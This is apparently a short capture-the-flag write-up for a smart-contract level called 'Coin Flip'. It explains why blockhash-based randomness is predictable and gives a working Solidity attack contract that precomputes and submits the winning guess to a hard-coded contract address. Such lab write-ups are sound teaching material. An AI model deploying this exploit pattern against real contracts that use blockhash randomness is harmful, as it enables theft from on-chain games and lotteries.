## 3\. Coin Flip

The lesson here is to never rely on blockchain global variables(block numbers, block hashes etc.) as a source for randomness or calculation thereof.

#### Solution

The solution was to write another contract which performs the same calculation as CoinFlip to find the guess, but additionally calls CoinFlip with the calculated guess in the same transaction. Thus, we correctly guess the flip outcome 10 times in a row.

The following code was used to accomplish this:

```

pragma solidity >=0.6.0 <0.9.0;


interface CoinFlip {
function flip(bool _guess) external returns (bool);
}

contract FlipAttack {
  CoinFlip coinFlip = CoinFlip(0x9413Baf3ad93C61bD02FDF4F5Fb7f4C68036cae2);
  function attack() public {
    // Calculate block value
    uint256 blockValue = uint256(blockhash(block.number - 1));
    // Calculate the flip value
    uint256 theFlip = blockValue/57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // Set the side to true if theFlip is 1 otherwise set it to false
    bool side = theFlip == 1 ? true : false;
    // Finally, call the victim's flip function with the calculated side value, which is also our guess
    coinFlip.flip(side);
  }
}
```
